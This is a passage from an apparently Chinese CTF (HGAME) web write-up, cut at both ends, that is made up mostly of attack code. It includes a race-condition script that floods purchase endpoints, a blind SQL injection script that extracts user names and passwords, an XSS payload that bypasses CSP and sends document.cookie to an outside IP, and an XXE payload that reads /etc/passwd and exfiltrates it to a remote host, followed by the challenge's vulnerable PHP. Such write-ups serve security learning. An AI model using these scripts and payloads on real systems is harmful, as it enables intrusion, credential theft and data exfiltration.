<span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://121.36.88.65:9999&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://121.36.88.65:9999/market.html&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">        burp0_data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;800001&quot;</span>, <span class="string">&quot;amount&quot;</span>: num&#125;</span><br><span class="line">        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;successfully buy %d items&quot;</span> % num)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>(<span class="params">num,loop=<span class="number">3</span></span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(loop):</span><br><span class="line">        burp0_url = <span class="string">&quot;http://121.36.88.65:9999/API/?method=solve&quot;</span></span><br><span class="line">        burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;gd44lbha3t9ltc1cgng5c755ni&quot;</span>&#125;</span><br><span class="line">        burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;*/*&quot;</span>, <span class="string">&quot;X-Requested-With&quot;</span>: <span class="string">&quot;XMLHttpRequest&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded; charset=UTF-8&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://121.36.88.65:9999&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://121.36.88.65:9999/market.html&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">        burp0_data = &#123;<span class="string">&quot;code&quot;</span>: <span class="string">&quot;800001&quot;</span>, <span class="string">&quot;amount&quot;</span>: num&#125;</span><br><span class="line">        result=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data).text</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> result:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;successfully solve %d items&quot;</span> % num)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    i=<span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = Pool(<span class="number">100</span>)</span><br><span class="line">        num=<span class="number">500</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            p.apply_async(buy, args=(num,))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Waiting for all buy subprocesses done...&#x27;</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        p.join()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;All subprocesses done.&#x27;</span>)</span><br><span class="line"></span><br><span class="line">        p = Pool(<span class="number">100</span>)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">            p.apply_async(solve, args=(num,))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Waiting for all solve subprocesses done...&#x27;</span>)</span><br><span class="line">        p.close()</span><br><span class="line">        p.join()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;All subprocesses done.&#x27;</span>)</span><br><span class="line">    </span><br></pre></td></tr></table></figure>



<h3 id="留言板"><a href="#留言板" class="headerlink" title="留言板"></a>留言板</h3><p>注册登陆的黑名单</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">allow: [<span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;z&#x27;</span>, </span><br><span class="line"><span class="string">&#x27;A&#x27;</span>, <span class="string">&#x27;B&#x27;</span>, <span class="string">&#x27;C&#x27;</span>, <span class="string">&#x27;D&#x27;</span>, <span class="string">&#x27;E&#x27;</span>, <span class="string">&#x27;F&#x27;</span>, <span class="string">&#x27;G&#x27;</span>, <span class="string">&#x27;H&#x27;</span>, <span class="string">&#x27;I&#x27;</span>, <span class="string">&#x27;J&#x27;</span>, <span class="string">&#x27;K&#x27;</span>, <span class="string">&#x27;L&#x27;</span>, <span class="string">&#x27;M&#x27;</span>, <span class="string">&#x27;N&#x27;</span>, <span class="string">&#x27;O&#x27;</span>, <span class="string">&#x27;P&#x27;</span>, <span class="string">&#x27;Q&#x27;</span>, <span class="string">&#x27;R&#x27;</span>, <span class="string">&#x27;S&#x27;</span>, <span class="string">&#x27;T&#x27;</span>, <span class="string">&#x27;U&#x27;</span>, <span class="string">&#x27;V&#x27;</span>, <span class="string">&#x27;W&#x27;</span>, <span class="string">&#x27;X&#x27;</span>, <span class="string">&#x27;Y&#x27;</span>, <span class="string">&#x27;Z&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>]</span><br><span class="line">disable: [<span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;/&#x27;</span>, <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;]&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\x0b&#x27;</span>, <span class="string">&#x27;\x0c&#x27;</span>]</span><br></pre></td></tr></table></figure>

<p>一个个检测输入点发现,delete方法存在sql注入</p>
<p>注入脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send</span>():</span></span><br><span class="line"></span><br><span class="line">    burp0_url = <span class="string">&quot;http://139.199.182.61:19999/index.php?method=send&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;ab5fgepp50bnaenppkju4md4qs&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://139.199.182.61:19999&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/x-www-form-urlencoded&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://139.199.182.61:19999/index.php&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    burp0_data = &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;aaa&quot;</span>&#125;</span><br><span class="line">    res=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)</span><br><span class="line">    <span class="keyword">if</span> res.status_code==<span class="number">200</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span> :</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_id</span>():</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    burp0_url = <span class="string">&quot;http://139.199.182.61:19999/index.php?message=aaa&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;ab5fgepp50bnaenppkju4md4qs&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://139.199.182.61:19999&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://139.199.182.61:19999/index.php&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">    html = res.text</span><br><span class="line">    <span class="keyword">try</span> :</span><br><span class="line">        soup = BeautifulSoup(html,<span class="string">&#x27;html.parser&#x27;</span>) <span class="comment">#把网页解析为BeautifulSoup对象</span></span><br><span class="line">        url=soup.find(<span class="string">&quot;span&quot;</span>,class_=<span class="string">&quot;message&quot;</span>).find(<span class="string">&quot;a&quot;</span>)[<span class="string">&#x27;href&#x27;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> url.replace(<span class="string">&quot;index.php?method=delete&amp;delete_id=&quot;</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span>(<span class="params">mesid</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://139.199.182.61:19999/index.php?message=aaa&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;ab5fgepp50bnaenppkju4md4qs&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;max-age=0&quot;</span>, <span class="string">&quot;Origin&quot;</span>: <span class="string">&quot;http://139.199.182.61:19999&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://139.199.182.61:19999/index.php&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    res=requests.get(burp0_url, headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line">    url=<span class="string">&quot;index.php?method=delete&amp;delete_id=&quot;</span>+<span class="built_in">str</span>(mesid)</span><br><span class="line">    <span class="keyword">if</span> url <span class="keyword">in</span> res.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#index.php?method=delete&amp;delete_id=6594</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params">mesid</span>):</span></span><br><span class="line">    burp0_url = <span class="string">&quot;http://139.199.182.61:19999/index.php&quot;</span></span><br><span class="line">    burp0_cookies = &#123;<span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;ab5fgepp50bnaenppkju4md4qs&quot;</span>&#125;</span><br><span class="line">    burp0_headers = &#123;<span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Referer&quot;</span>: <span class="string">&quot;http://139.199.182.61:19999/index.php&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">    requests.get(burp0_url, params=&#123;<span class="string">&quot;method&quot;</span>:<span class="string">&quot;delete&quot;</span>,<span class="string">&quot;delete_id&quot;</span>:mesid&#125;,headers=burp0_headers, cookies=burp0_cookies)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sql_inj</span>(<span class="params">sql</span>):</span></span><br><span class="line">    mesid=get_id()</span><br><span class="line">    delete(<span class="built_in">str</span>(mesid)+<span class="string">&quot; and (&quot;</span>+sql+<span class="string">&quot;) #&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> check(mesid):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;%s success&quot;</span> % sql)</span><br><span class="line">        send()</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%s fail&quot;</span> % sql)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># sql_inj(&quot;(select substr(hex(&#x27;1&#x27;),1,1))=&#x27;3&#x27;&quot;)</span></span><br><span class="line">cha=<span class="string">&quot;0123456789ABCDEF&quot;</span></span><br><span class="line">result=<span class="string">&quot;&quot;</span></span><br><span class="line">p=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    p+=<span class="number">1</span></span><br><span class="line">    temp=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cha:</span><br><span class="line">        <span class="keyword">if</span> sql_inj(<span class="string">&quot;(select substr(hex(group_concat(name,&#x27;,&#x27;,password)),%d,1) FROM user where id=1)=&#x27;%s&#x27;&quot;</span> % (p,i) ):</span><br><span class="line">            result+=i</span><br><span class="line">            temp=i</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> temp!=result[-<span class="number">1</span>]:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#information_schema,babysql</span></span><br><span class="line"><span class="comment">#messages,user</span></span><br><span class="line"><span class="comment">#id,name,password</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h3><p>操操操,这题对我有毒,我这里不显示csp,导致我卡了很久</p>
<p>存在csp:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &#x27;self&#x27;; script-src &#x27;self&#x27;</span><br></pre></td></tr></table></figure>

<p>先检测一下</p>
<p> <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">https://csp-evaluator.withgoogle.com/</a> </p>
<p><img src="https://i.loli.net/2020/02/06/xmcQvbWV7EXRisq.png" alt="image19320"></p>
<p>说object-src不安全</p>
<p>这个策略已经ban掉了内联脚本,所以我们直接传一个js代码过去没用</p>
<p>我们对send方法进行检测发现,会过滤script,但是用双写就可以绕过,还会把大写转成小写</p>
<p>用burp代理,查看发送的请求,我们可以会注意到<code>/send</code>会直接返回我们发送的内容,利用这个恰好可以绕过<code>script-src &#39;self&#39;</code> ,</p>
<p>我们发送以下payload(用script标签也一样)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;send?message=%3c%73%76%67%20%6f%6e%6c%6f%61%64%3d%22%61%6c%65%72%74%28%29%22%3e&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>

<p>成功弹窗,但是我们还有<code>default-src &#39;self&#39;</code>阻碍着我们带回数据</p>
<p>因为没有设置<code>object-src</code>我们可以用<code>embed </code>标签带回数据</p>
<p>最后的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;send?message=&lt;body&gt;&lt;scscrscriptiptript&gt;</span><br><span class="line">var+iframe+%3d+eval(%22document.create\105lement(&#x27;embed&#x27;)%22)%3b</span><br><span class="line">iframe.src%3d%22http%3a//39.108.164.219%3a60005/%3f%22%2bdocument.cookie%3b</span><br><span class="line">eval(%22document.body.append\103hild(iframe)%22)%3b&lt;/scrscrscriptiptipt&gt;&lt;/body&gt;&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure>



<p><code>hgame&#123;1ts_@_$impL3_CSP_bYp4ss1ng_Ch@!!enge.&#125;</code></p>
<h3 id="代打出题人服务中心"><a href="#代打出题人服务中心" class="headerlink" title="代打出题人服务中心"></a>代打出题人服务中心</h3><p>一看就知道有xxe漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY % sp SYSTEM &quot;http://39.108.164.219:60005/evil.xml&quot;&gt;</span><br><span class="line">%sp;</span><br><span class="line">%param1;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;exfil;&lt;/r&gt;</span><br><span class="line"></span><br><span class="line">File stored on http://39.108.164.219/evil.xml</span><br><span class="line">&lt;!ENTITY % data SYSTEM &quot;php://filter/convert.base64-encode/resource=/etc/passwd&quot;&gt;</span><br><span class="line">&lt;!ENTITY % param1 &quot;&lt;!ENTITY exfil SYSTEM &#x27;http://39.108.164.219:60005/?a=%data;&#x27;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>



<p>submit.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line">libxml_disable_entity_loader(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = file_get_contents(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="variable">$stmt</span> = <span class="variable">$conn</span>-&gt;prepare(<span class="string">&quot;INSERT INTO info (id, chal_name, bd_level, bd_time) VALUES (:id, :chal_name, :bd_level, :bd_time)&quot;</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;bindParam(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$id</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;bindParam(<span class="string">&#x27;:chal_name&#x27;</span>, <span class="variable">$chal_name</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;bindParam(<span class="string">&#x27;:bd_level&#x27;</span>, <span class="variable">$level</span>);</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;bindParam(<span class="string">&#x27;:bd_time&#x27;</span>, <span class="variable">$level</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;loadXML(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="variable">$creds</span> = simplexml_import_dom(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$id</span> = <span class="variable">$creds</span>-&gt;id;</span><br><span class="line">    <span class="variable">$chal_name</span> = <span class="variable">$creds</span>-&gt;name;</span><br><span class="line">    <span class="variable">$level</span> = <span class="variable">$creds</span>-&gt;level;</span><br><span class="line">    <span class="variable">$time</span> = <span class="variable">$creds</span>-&gt;time;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$id</span> == <span class="string">&quot;&quot;</span> || <span class="variable">$level</span> == <span class="string">&quot;&quot;</span> || <span class="variable">$chal_name</span> == <span class="string">&quot;&quot;</span>|| <span class="variable">$time</span> == <span class="string">&quot;&quot;</span>) &#123;</span><br><span class="line">        <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="string">&quot;请填写信息！&quot;</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable">$result</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$stmt</span>-&gt;execute();</span><br><span class="line">    <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="string">&quot;已提交成功，正在为您安排打手&quot;</span>);</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">    <span class="variable">$result</span> = sprintf(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="string">&quot;提交失败！&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span 